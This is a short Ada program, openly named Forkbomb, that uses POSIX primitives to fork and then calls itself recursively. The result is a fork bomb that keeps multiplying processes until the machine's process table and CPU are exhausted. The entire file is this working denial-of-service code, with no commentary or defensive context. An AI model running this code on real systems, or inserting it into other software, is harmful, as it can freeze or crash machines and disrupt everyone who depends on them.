with POSIX.Process_Identification,
     POSIX.Unsafe_Process_Primitives;
procedure Forkbomb is
   unused : POSIX.Process_Identification.Process_ID;
begin
   unused := POSIX.Unsafe_Process_Primitives.Fork;
   Forkbomb;
end Forkbomb;
